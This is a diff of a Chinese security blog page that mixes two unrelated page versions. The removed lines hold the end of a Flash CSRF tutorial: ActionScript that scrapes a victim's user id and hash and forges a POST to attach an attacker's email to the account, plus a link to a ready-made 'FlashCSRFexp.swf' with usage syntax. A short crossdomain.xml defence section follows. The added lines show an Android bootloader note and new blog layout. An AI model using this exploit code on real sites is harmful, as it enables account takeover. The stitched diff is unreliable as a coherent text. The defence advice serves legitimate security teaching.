&quot;&quot;;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; sendToURL(request);&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; var loader:URLLoader=new URLLoader();&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; loader.addEventListener(Event.COMPLETE,completeHandler);&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; function completeHandler(event:Event):void{&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; var userid:String=((loader.data+&quot;&quot;).match(/\/xxxx\/mxxxx\.php\?xxid=(\d+)/)||[&quot;&quot;,&quot;&quot;])[1];
-
- var masthash:String=((loader.data+&quot;&quot;).match(/\/xxxx\/mxxxx\.php\?masthash=(\d+)/)||[&quot;&quot;,&quot;&quot;])[1];&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; echo_txt.text =&#160; masthash;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; //伪造申请密保邮箱POST请求&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; var emailtargetURL:String = &quot;http://xxxxxx.xx.cc/xxxx/xxxx.jsp?mark=send&quot;;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; var emailrequest:URLRequest = new URLRequest(emailtargetURL);&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; emailrequest.method = URLRequestMethod.POST;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; var postdata:Object = new Array();&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; postdata[0]=&quot;xxxx=xxxx@xxx.cc&amp;xxxx=&quot;+xxxxx&amp;&quot;xxxxx=&quot;+xxx;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; emailrequest.data = postdata[0];&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; sendToURL(emailrequest);&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; }&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; loader.load(request);&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; }&#160;&#160;&#160;&#160; }
-}</pre>
-
-<p>我们用一个新账号来做测试看看效果 ：）</p>
-
-<h4>0x04 Flash CSRF怎么防御</h4>
-
-<hr>
-
-<p>知道Flash CSRF攻击流程，然后在防御就so easy了~:)</p>
-
-<p>妈妈再也不担心我被Flash CSRF啦~虽然各位看官都明白了怎么防御，但是还是照例啰嗦一下啦：</p>
-
-<p>一句话概括：站点根目录CrossDomain.xml跨域获取信息权限控制好，精确到子域，不给不法分子留下机会！！<br>  <br>附一份自己网站的CrossDomain.xml文件权限配置：</p>
-
-<pre>&lt;?xml version=&quot;1.0&quot;?&gt;
-&lt;cross-domain-policy&gt;&#160;&#160; &lt;allow-access-from domain=&quot;http://xx.xx.com&quot; secure=&quot;true”/&gt;
-&lt;allow-access-from domain=&quot;http://cc.xx.com&quot; secure=&quot;true”/&gt;
-&lt;/cross-domain-policy&gt;</pre>
-
-<p>根据自己的业务需求来更改CrossDomain.xml文件配置，切记精确到子域，这样会大大减少Flash CSRF的风险！</p>
-
-<p>通用Flash CSRF EXP : <a href="http://wydrops-wordpress.stor.sinaapp.com/uploads/2013/10/FlashCSRFexp.swf" target="_blank" rel="external">FlashCSRFexp.swf</a></p>
-
-<p>使用方法：</p>
-
-<pre><code>FlashCSRFexp.swf?url=http://www.xx.xx/x.jsp?&amp;xx=xx&amp;xx=xx&amp;xx=xx&amp;xx=xx
-PS:url=[post请求的地址]&amp;[参数值用&amp;分开]
-</code></pre>
-
-<p>谢谢各位大牛捧场，十分感谢二哥，长短短，PKAV团队的技术栽培 :)~</p>
-
-<p>from <a href="http://drops.wooyun.org/tips/688" target="_blank" rel="external">http://drops.wooyun.org/tips/688</a></p>
+<p>解锁bootloader,注意需设置允许USB调试,手机会重启解锁.</p><br>
       
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://id.cker.in/1080.seo/" data-id="cirz4nzqm007eoz765ni51eq6" class="article-share-link">Share</a>
+      </p>
       
+      <p>
+          <a href="/1103.seo/" class="excerpt-link">Read More...</a>
+      </p>
       
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tag/CSRF/">CSRF</a></li></ul>
-
-    </footer>
-  </div>
+    </section>
+  </article>
   
-</article>
-
-
-  
-
-
-  <nav id="page-nav">
-    <a class="extend prev" rel="prev" href="/page/4/">&laquo; __('prev')</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/34/">34</a><a class="extend next" rel="next" href="/page/6/">__('next') &raquo;</a>
+  <nav class="pagination" role="pagination">
+    <a class="newer-posts" href="/page/4/">← Newer Posts</a>
+    <span class="page-number">Page 5 of 57</span>
+    <a class="older-posts" href="/page/6/">Older Posts →</a>
   </nav>
-</section>
-        
-          <aside id="sidebar">
+</main>
+
+
+      
+<footer class="site-footer">
   
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Categories</h3>
-    <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/category/CPP-C-ASPNET-PHP-Js/">CPP-C#-ASPNET-PHP-Js</a></li><li class="category-list-item"><a class="category-list-link" href="/category/N900-IPhone-Android/">N900-IPhone-Android</a></li><li class="category-list-item"><a class="category-list-link" href="/category/Web安全/">Web安全</a></li><li class="category-list-item"><a class="category-list-link" href="/category/linux笔记/">linux笔记</a></li><li class="category-list-item"><a class="category-list-link" href="/category/原创文章/">原创文章</a></li><li class="category-list-item"><a class="category-list-link" href="/category/影音娱乐/">影音娱乐</a></li><li class="category-list-item"><a class="category-list-link" href="/category/无线安全/">无线安全</a></li><li class="category-list-item"><a class="category-list-link" href="/category/渗透工具、攻防视频/">渗透工具、攻防视频</a></li><li class="category-list-item"><a class="category-list-link" href="/category/渗透测试/">渗透测试</a></li><li class="category-list-item"><a class="category-list-link" href="/category/疑难杂症/">疑难杂症</a></li><li class="category-list-item"><a class="category-list-link" href="/category/精品软件/">精品软件</a></li><li class="category-list-item"><a class="category-list-link" href="/category/絮叨碎语/">絮叨碎语</a></li><li class="category-list-item"><a class="category-list-link" href="/category/黑客技巧/">黑客技巧</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tags</h3>
-    <div class="widget">
-      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tag/net/">.net</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/0day/">0day</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/12306/">12306</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/12306刷票外挂/">12306刷票外挂</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/12306刷票外挂下载/">12306刷票外挂下载</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/1521/">1521</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/3389/">3389</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/3600safe/">3600safe</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/ACL/">ACL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/APT/">APT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/ASP/">ASP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/ASP中FSO的神奇功能/">ASP中FSO的神奇功能</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/ATM/">ATM</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/ActionScript中shellcode的定位和提取/">ActionScript中shellcode的定位和提取</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/ActionScript的反汇编和反编译/">ActionScript的反汇编和反编译</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Acunetix-Web-Vulnerability-Scanner/">Acunetix Web Vulnerability Scanner</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Anonymous/">Anonymous</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Apache/">Apache</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Armitage/">Armitage</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Auditd/">Auditd</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/BDFProxy/">BDFProxy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Base64变异注入/">Base64变异注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Base64变形注入/">Base64变形注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Beacon/">Beacon</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Bettercap/">Bettercap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/BlueStacks/">BlueStacks</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Brup-Suite/">Brup Suite</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/C/">C#</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/CANVAS/">CANVAS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/CPanel/">CPanel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/CSRF/">CSRF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/CentOS/">CentOS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Chrome/">Chrome</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Cobalt-Strike/">Cobalt Strike</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/ColdFusion/">ColdFusion</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Crack/">Crack</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Csdn/">Csdn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/C段/">C段</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/DDos/">DDos</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/DJ/">DJ</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/DLL劫持漏洞/">DLL劫持漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/DNS/">DNS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/DNS劫持/">DNS劫持</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/DRDoS/">DRDoS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Damn-Small-Linux/">Damn Small Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Debian/">Debian</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/DedeCMS/">DedeCMS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Discuz/">Discuz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Discuz-X2-5/">Discuz!X2.5</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Discuz-X2升级/">Discuz!X2升级</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Docker/">Docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/ESX/">ESX</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/ESXi/">ESXi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Exchange/">Exchange</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Exploit/">Exploit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/FSO/">FSO</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/FTP/">FTP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Facebook/">Facebook</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/FastCGI/">FastCGI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Flash文件的提取/">Flash文件的提取</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Fuzzing/">Fuzzing</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/GEA翻墙/">GEA翻墙</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/GWF/">GWF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Get-Shell/">Get Shell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Godaddy/">Godaddy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Google-Hack/">Google Hack</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Group-By一个不常用的用法/">Group By一个不常用的用法</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/HTML5/">HTML5</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Hacking-Team/">Hacking Team</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Havij-1-152-Pro-最新破解版/">Havij 1.152 Pro 最新破解版</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Helen/">Helen</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Honeypot/">Honeypot</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/IISPY/">IISPY</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/IIS写权限/">IIS写权限</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/IPad/">IPad</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/IPv6/">IPv6</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/JDWP/">JDWP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/JavaScript/">JavaScript</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Kali/">Kali</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Kismet/">Kismet</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Kloxo/">Kloxo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/LDAP/">LDAP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/LNMP/">LNMP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/LTM/">LTM</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Linux/">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Linux-Mint/">Linux Mint</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Lxadmin/">Lxadmin</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/MFP/">MFP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/MS12-020/">MS12-020</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Mattermost/">Mattermost</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/MeeGo/">MeeGo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Memcached/">Memcached</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Metasploit/">Metasploit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Metasploitable/">Metasploitable</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Metasploit和armitage整合/">Metasploit和armitage整合</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Mongodb/">Mongodb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Mysql/">Mysql</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/N900/">N900</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Nessus/">Nessus</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/NetHunter/">NetHunter</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Nginx/">Nginx</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Nginx平滑升级Tengine/">Nginx平滑升级Tengine</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Nodejs/">Nodejs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/N点虚拟主机提权实例/">N点虚拟主机提权实例</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/OWASP/">OWASP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Offensive-security/">Offensive security</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Office-365/">Office 365</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Office365/">Office365</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/OpenVAS/">OpenVAS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Parallels-Desktop/">Parallels Desktop</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Penetration-test/">Penetration test</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Php-fpm/">Php-fpm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Phpcms/">Phpcms</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/PowerEasy/">PowerEasy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/PowerShell/">PowerShell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Puppy-Linux/">Puppy Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/QQ2012/">QQ2012</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Qubes/">Qubes</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Rails/">Rails</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/RedHat/">RedHat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Redis/">Redis</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Remote/">Remote</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Ruby/">Ruby</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/SIP协议/">SIP协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/SMB中继攻击/">SMB中继攻击</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/SQL-Injection/">SQL Injection</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/SQLServer/">SQLServer</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/SQLmap/">SQLmap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/SQL注入/">SQL注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/SQL注射漏洞/">SQL注射漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/SQL通用防注入系统asp版漏洞/">SQL通用防注入系统asp版漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/SSL-VPN/">SSL VPN</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/SSRF/">SSRF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Sa/">Sa</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Scribe/">Scribe</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Search-Engine/">Search Engine</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Shlcms/">Shlcms</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Shopex-4-8-5/">Shopex 4.8.5</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/SiteEngine/">SiteEngine</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Skype源代码泄露/">Skype源代码泄露</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/SliTaz/">SliTaz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Snort/">Snort</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Socket/">Socket</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Sublime/">Sublime</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Tengine/">Tengine</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/TheMole/">TheMole</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/ThinkPHP/">ThinkPHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Thrift/">Thrift</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Tiny-Core-Linux/">Tiny Core Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Tomcat/">Tomcat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Tor/">Tor</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Tutorial/">Tutorial</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Ubuntu/">Ubuntu</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/VC/">VC</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/VLAN/">VLAN</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/VMWare-Workstation/">VMWare Workstation</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/VMware/">VMware</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/VOIP/">VOIP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/VOIP网络电话系统的搭建/">VOIP网络电话系统的搭建</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/VPN/">VPN</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/VPS/">VPS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/VS2008/">VS2008</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/VS2010/">VS2010</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Veil/">Veil</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Veil-Evasion/">Veil-Evasion</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/VoIP渗透测试/">VoIP渗透测试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Vulnerability/">Vulnerability</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/WEP/">WEP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/WIN2003/">WIN2003</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/WMIC/">WMIC</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/WPA2/">WPA2</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/WVS/">WVS</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/WarDriving/">WarDriving</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Webmin/">Webmin</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Webshell/">Webshell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Web漏洞扫描/">Web漏洞扫描</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/WhatWeb/">WhatWeb</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Windows/">Windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Wordpress/">Wordpress</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Wordpress博客搬家/">Wordpress博客搬家</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Wordpress插件/">Wordpress插件</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/XML-Schema-Definition/">XML Schema Definition</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Xen/">Xen</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Xsser/">Xsser</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/YY批量注册器/">YY批量注册器</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/YouTube/">YouTube</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/ZPanel/">ZPanel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/Zend/">Zend</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/alien/">alien</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/autopwn/">autopwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/backtrack/">backtrack</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/bat/">bat</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/bt/">bt</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/bt5/">bt5</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/burpsuite/">burpsuite</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/bypass/">bypass</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/cobaltstrike/">cobaltstrike</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/cookie欺骗/">cookie欺骗</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/dir溢出/">dir溢出</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/dis9/">dis9</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/dpkg/">dpkg</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/ettercap/">ettercap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/fckeditor/">fckeditor</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/fierce/">fierce</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/git/">git</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/hijacking/">hijacking</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/iOS-Hacking-Course/">iOS Hacking Course</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/iPhone开发/">iPhone开发</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/idc/">idc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/iis解析漏洞/">iis解析漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/iphone/">iphone</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/jboss/">jboss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/joomscan/">joomscan</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/kaili/">kaili</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/keylogger/">keylogger</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/kisses-tar-gz/">kisses.tar.gz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/leanote/">leanote</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/loader/">loader</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/meterpreter/">meterpreter</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/mimikatz/">mimikatz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/mongrel/">mongrel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/msf/">msf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/nmap/">nmap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/oracle/">oracle</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/oracle注入/">oracle注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/php/">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/phpmyadmin/">phpmyadmin</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/post/">post</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/shell/">shell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/shellcode调试/">shellcode调试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/siege/">siege</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/sinopass/">sinopass</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/snmp/">snmp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/squid/">squid</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/ssh/">ssh</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/study/">study</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/vCenter/">vCenter</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/vClient/">vClient</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/vSphere/">vSphere</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/web渗透测试/">web渗透测试</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/web渗透测试工具包/">web渗透测试工具包</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/wpscan/">wpscan</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/xss/">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/一句话/">一句话</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/上传漏洞/">上传漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/中央民族大学/">中央民族大学</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/九区大黑阔/">九区大黑阔</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/书/">书</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/互联网/">互联网</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/京东商城/">京东商城</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/任意代码执行/">任意代码执行</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/优惠码/">优惠码</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/会话劫持/">会话劫持</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/传奇私服/">传奇私服</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/免杀/">免杀</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/免费代理/">免费代理</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/免费翻墙/">免费翻墙</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/免运费/">免运费</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/入侵/">入侵</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tag/公开课/">公开课</a></li><li class="tag-list-item"><a class="tag-list-link" 